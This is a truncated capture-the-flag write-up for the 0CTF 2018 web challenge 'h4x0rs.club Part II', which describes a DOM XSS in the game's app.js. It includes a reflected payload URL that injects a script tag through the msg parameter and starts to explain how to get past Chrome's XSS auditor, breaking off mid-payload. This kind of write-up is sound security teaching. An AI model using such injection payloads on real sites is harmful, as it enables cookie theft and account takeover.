# 0CTF 2018: h4x0rs.club  - Part II

**Category:** Web  
**Points:** 687  
**Solves:** 6  
**Description:**

> Get document.cookie of the admin: https://h4x0rs.club/game/

**Note:** This is an unintendend solution for the challenge.  
## Write-up  
  
### Finding the XSS

There is a XSS on `/game/javascripts/app.js` in the function responsible for
checking if the player won or lost the game.

```  
function b() {  
      x(), $(".js-user").append($("#audiences").html()), $(".challenge-out-of-time").show();  
      [...]  
}  
```

The function above copies the html of an element with id `audiences` to an
element with class `js-user` so by creating these elements using the injection
on `/game/?msg=` we can achieve javascript execution.

Then, theoretically, by accessing `https://h4x0rs.club/game/?msg=<div
id="audiences"><script>alert(1);</script></div><div class="js-user"></div>`
and clicking on the play button an alert should pop up after around 15 seconds
(the time it takes for the game to end).

But it doesn't, we are stopped by Chrome's XSS auditor which blocks the access
to the page because it detected that a `script` tag on the URL was also
reflected into the page.

We can bypass it by sending `https://h4x0rs.club/game/?msg=<div
id="audiences"><script>

Original writeup
(https://github.com/lbherrera/writeups/blob/master/0ctf_quals-2018/h4x0rs.club/README.md).